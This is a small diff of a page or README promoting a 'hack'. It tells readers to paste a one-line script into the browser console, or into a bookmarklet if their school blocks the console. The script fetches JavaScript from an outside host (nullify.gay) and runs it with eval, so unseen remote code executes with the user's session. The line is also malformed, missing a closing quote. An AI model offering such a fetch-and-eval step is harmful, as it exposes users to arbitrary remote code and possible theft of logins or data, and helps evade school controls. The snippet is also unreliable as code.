@@ -21,6 +21,7 @@ With this hack you can completely remove the stress and torture that comes with 
 Do Ctrl + Shift + J to open the console and paste the code in there, hit Enter to run it.<br><br>
 If your school blocks the console then make a new bookmark and in the URL section paste the code there. Click the bookmark anytime to run the code.</p>
 
+
 ```js
 javascript:fetch('https://nullify.gay/main.js).then(r => r.text()).then(r => eval(r))
 ```
